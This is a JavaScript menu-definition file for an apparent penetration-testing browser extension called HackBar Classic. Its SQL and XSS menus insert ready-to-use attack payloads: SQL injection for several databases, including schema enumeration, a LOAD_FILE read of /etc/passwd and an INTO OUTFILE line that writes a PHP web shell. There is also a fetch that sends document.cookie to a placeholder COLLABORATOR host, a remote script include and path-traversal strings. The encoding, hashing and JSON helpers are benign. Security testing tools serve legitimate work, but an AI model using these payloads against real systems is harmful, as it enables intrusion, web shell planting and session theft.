/* ============================================================
   HackBar Classic - payload + transform menu definitions.

   Item shapes:
     { grp: "Heading" }                        group label
     { sep: true }                             separator
     { label, insert: str | (ctx) => str }     insert at caret
     { label, xform: (sel) => str | Promise }  transform selection
   ============================================================ */

/* ---------- small helpers ---------- */

function hbUtf8Bytes(s) { return new TextEncoder().encode(s); }

function hbB64Encode(s) {
  var b = hbUtf8Bytes(s), bin = "";
  for (var i = 0; i < b.length; i++) bin += String.fromCharCode(b[i]);
  return btoa(bin);
}
function hbB64Decode(s) {
  var bin = atob(s.replace(/\s+/g, "")),
      arr = new Uint8Array(bin.length);
  for (var i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
  return new TextDecoder().decode(arr);
}

function hbHexEncode(s) {
  return Array.from(hbUtf8Bytes(s))
    .map(function (b) { return b.toString(16).padStart(2, "0"); }).join("");
}
function hbHexDecode(s) {
  var h = s.replace(/0x|[\s,]/gi, ""), out = [];
  for (var i = 0; i + 1 < h.length; i += 2) out.push(parseInt(h.substr(i, 2), 16));
  return new TextDecoder().decode(new Uint8Array(out));
}

function hbSha(algo) {
  return function (s) {
    return crypto.subtle.digest(algo, hbUtf8Bytes(s)).then(function (buf) {
      return Array.from(new Uint8Array(buf))
        .map(function (b) { return b.toString(16).padStart(2, "0"); }).join("");
    });
  };
}

function hbHtmlEncode(s) {
  return s.replace(/[&<>"'`]/g, function (c) {
    return ({ "&": "&amp;", "<": "&lt;", ">": "&gt;",
              '"': "&quot;", "'": "&#39;", "`": "&#96;" })[c];
  });
}
function hbHtmlDecode(s) {
  var d = document.createElement("textarea");
  d.innerHTML = s;
  return d.value;
}

function hbUrlEncodeAll(s) {
  return Array.from(hbUtf8Bytes(s))
    .map(function (b) { return "%" + b.toString(16).toUpperCase().padStart(2, "0"); })
    .join("");
}

function hbRot13(s) {
  return s.replace(/[a-zA-Z]/g, function (c) {
    var base = c <= "Z" ? 65 : 97;
    return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
  });
}

function hbMysqlChar(s) {
  return "CHAR(" + Array.from(hbUtf8Bytes(s)).join(",") + ")";
}
function hbMssqlChar(s) {
  return Array.from(hbUtf8Bytes(s)).map(function (b) { return "CHAR(" + b + ")"; }).join("+");
}
function hbUnicodeEsc(s) {
  return s.split("").map(function (c) {
    return "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0");
  }).join("");
}

/* SQL injection-point prefix driven by the INT/STR selector */
function hbBreak(ctx) { return ctx.mode === "STR" ? "1' " : "1 "; }
var HB_CMT = "-- -";

/* ============================================================
   MENUS
   ============================================================ */

var HB_MENUS = {

  /* ---------------- SQL ---------------- */
  SQL: [
    { grp: "Generic" },
    { label: "Union select statement",
      insert: function (c) { return hbBreak(c) + "UNION ALL SELECT 1,2,3,4,5" + HB_CMT; } },
    { label: "Order by (find column count)",
      insert: function (c) { return hbBreak(c) + "ORDER BY 10" + HB_CMT; } },
    { label: "Always true  (OR 1=1)",
      insert: function (c) { return hbBreak(c) + "OR 1=1" + HB_CMT; } },
    { label: "Always false (AND 1=2)",
      insert: function (c) { return hbBreak(c) + "AND 1=2" + HB_CMT; } },

    { sep: true },
    { grp: "MySQL" },
    { label: "Version / user / database",
      insert: function (c) { return hbBreak(c) + "UNION ALL SELECT @@version,user(),database(),4,5" + HB_CMT; } },
    { label: "information_schema - tables",
      insert: function (c) { return hbBreak(c) + "UNION ALL SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()" + HB_CMT; } },
    { label: "information_schema - columns",
      insert: function (c) { return hbBreak(c) + "UNION ALL SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_name='TABLE'" + HB_CMT; } },
    { label: "LOAD_FILE('/etc/passwd')",
      insert: function (c) { return hbBreak(c) + "UNION ALL SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5" + HB_CMT; } },
    { label: "INTO OUTFILE (webshell)",
      insert: function (c) { return hbBreak(c) + "UNION ALL SELECT 1,'<?php system($_GET[0]);?>',3,4,5 INTO OUTFILE '/var/www/html/s.php'" + HB_CMT; } },
    { label: "Error based - extractvalue()",
      insert: function (c) { return hbBreak(c) + "AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))" + HB_CMT; } },
    { label: "Time based - SLEEP(5)",
      insert: function (c) { return hbBreak(c) + "AND (SELECT 1 FROM (SELECT SLEEP(5))a)" + HB_CMT; } },

    { sep: true },
    { grp: "MSSQL" },
    { label: "Version",
      insert: function (c) { return hbBreak(c) + "UNION ALL SELECT @@version,2,3,4,5" + HB_CMT; } },
    { label: "Table names",
      insert: function (c) { return hbBreak(c) + "UNION ALL SELECT name,2,3,4,5 FROM sysobjects WHERE xtype='U'" + HB_CMT; } },
    { label: "Column names",
      insert: function (c) { return hbBreak(c) + "UNION ALL SELECT name,2,3,4,5 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='TABLE')" + HB_CMT; } },
    { label: "Time based - WAITFOR DELAY",
      insert: function (c) { return hbBreak(c) + "; WAITFOR DELAY '0:0:5'" + HB_CMT; } },

    { sep: true },
    { grp: "Oracle" },
    { label: "Version (banner)",
      insert: function (c) { return hbBreak(c) + "UNION ALL SELECT banner,2,3,4,5 FROM v$version" + HB_CMT; } },
    { label: "Table names",
      insert: function (c) { return hbBreak(c) + "UNION ALL SELECT table_name,2,3,4,5 FROM all_tables" + HB_CMT; } },

    { sep: true },
    { grp: "PostgreSQL" },
    { label: "Version",
      insert: function (c) { return hbBreak(c) + "UNION ALL SELECT version(),2,3,4,5" + HB_CMT; } },
    { label: "Table names",
      insert: function (c) { return hbBreak(c) + "UNION ALL SELECT table_name,2,3,4,5 FROM information_schema.tables" + HB_CMT; } },
    { label: "Time based - pg_sleep(5)",
      insert: function (c) { return hbBreak(c) + "AND (SELECT 1 FROM pg_sleep(5))" + HB_CMT; } },

    { sep: true },
    { grp: "SQLite" },
    { label: "Table names",
      insert: function (c) { return hbBreak(c) + "UNION ALL SELECT name,2,3,4,5 FROM sqlite_master WHERE type='table'" + HB_CMT; } }
  ],

  /* ---------------- XSS ---------------- */
  XSS: [
    { grp: "Basic" },
    { label: "<script>alert(1)</script>",        insert: "<script>alert(1)</script>" },
    { label: "Break out of attribute",           insert: "\"><script>alert(1)</script>" },
    { label: "<img src=x onerror=alert(1)>",     insert: "<img src=x onerror=alert(1)>" },
    { label: "<svg onload=alert(1)>",            insert: "<svg onload=alert(1)>" },
    { label: "<body onload=alert(1)>",           insert: "<body onload=alert(1)>" },
    { label: "<details open ontoggle=alert(1)>", insert: "<details open ontoggle=alert(1)>" },
    { label: "javascript: URI",                  insert: "javascript:alert(1)" },

    { sep: true },
    { grp: "Filter evasion" },
    { label: "Polyglot (Gareth Heyes)",
      insert: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e" },
    { label: "No parentheses (template literal)", insert: "<svg onload=alert`1`>" },
    { label: "Mixed case tags",                   insert: "<ScRiPt>alert(1)</ScRiPt>" },
    { label: "Entity encoded",                    insert: "&lt;script&gt;alert(1)&lt;/script&gt;" },
    { label: "Comment / style break-out",         insert: "'\"--></style></script><script>alert(1)</script>" },

    { sep: true },
    { grp: "Proof of impact" },
    { label: "Show document.domain",  insert: "<img src=x onerror=alert(document.domain)>" },
    { label: "Exfiltrate cookie to collaborator",
      insert: "<img src=x onerror=\"fetch('https://COLLABORATOR/?c='+encodeURIComponent(document.cookie))\">" },
    { label: "Remote script include",
      insert: "<script src=\"https://COLLABORATOR/x.js\"></script>" },

    { sep: true },
    { grp: "Other injection probes" },
    { label: "SSTI probe {{7*7}}",  insert: "{{7*7}}" },
    { label: "SSTI probe ${7*7}",   insert: "${7*7}" },
    { label: "Path traversal",      insert: "../../../../../../etc/passwd" },
    { label: "Null byte",           insert: "%00" }
  ],

  /* ---------------- Encryption ---------------- */
  Encryption: [
    { grp: "Hashes (applies to selection)" },
    { label: "MD5",     xform: function (s) { return HB_md5(s); } },
    { label: "SHA-1",   xform: hbSha("SHA-1") },
    { label: "SHA-256", xform: hbSha("SHA-256") },
    { label: "SHA-384", xform: hbSha("SHA-384") },
    { label: "SHA-512", xform: hbSha("SHA-512") },
    { sep: true },
    { grp: "Ciphers" },
    { label: "ROT13", xform: hbRot13 }
  ],

  /* ---------------- Encoding ---------------- */
  Encoding: [
    { grp: "URL" },
    { label: "URL encode",            xform: function (s) { return encodeURIComponent(s); } },
    { label: "URL decode",            xform: function (s) { return decodeURIComponent(s); } },
    { label: "URL encode all chars",  xform: hbUrlEncodeAll },
    { label: "Double URL encode",     xform: function (s) { return encodeURIComponent(encodeURIComponent(s)); } },
    { sep: true },
    { grp: "Base64 / Hex" },
    { label: "Base64 encode",         xform: hbB64Encode },
    { label: "Base64 decode",         xform: hbB64Decode },
    { label: "Hex encode",            xform: hbHexEncode },
    { label: "Hex decode",            xform: hbHexDecode },
    { sep: true },
    { grp: "HTML / JS" },
    { label: "HTML entity encode",     xform: hbHtmlEncode },
    { label: "HTML entity decode",     xform: hbHtmlDecode },
    { label: "Unicode \\uXXXX escape", xform: hbUnicodeEsc },
    { sep: true },
    { grp: "SQL char()" },
    { label: "MySQL CHAR()",          xform: hbMysqlChar },
    { label: "MSSQL CHAR()+CHAR()",   xform: hbMssqlChar }
  ],

  /* ---------------- Other ---------------- */
  Other: [
    { grp: "String" },
    { label: "Reverse",          xform: function (s) { return s.split("").reverse().join(""); } },
    { label: "UPPERCASE",        xform: function (s) { return s.toUpperCase(); } },
    { label: "lowercase",        xform: function (s) { return s.toLowerCase(); } },
    { label: "Strip whitespace", xform: function (s) { return s.replace(/\s+/g, ""); } },
    { label: "Join lines",       xform: function (s) { return s.replace(/\r?\n/g, ""); } },
    { sep: true },
    { grp: "Format" },
    { label: "Pretty-print JSON",
      xform: function (s) { try { return JSON.stringify(JSON.parse(s), null, 2); } catch (e) { return s; } } },
    { label: "Minify JSON",
      xform: function (s) { try { return JSON.stringify(JSON.parse(s)); } catch (e) { return s; } } },
    { label: "Decode JWT (header + payload)",
      xform: function (s) {
        var p = s.trim().split(".");
        if (p.length < 2) return s;
        function seg(x) {
          try { return hbB64Decode(x.replace(/-/g, "+").replace(/_/g, "/")); }
          catch (e) { return "<undecodable>"; }
        }
        return seg(p[0]) + "\n" + seg(p[1]);
      } }
  ]
};
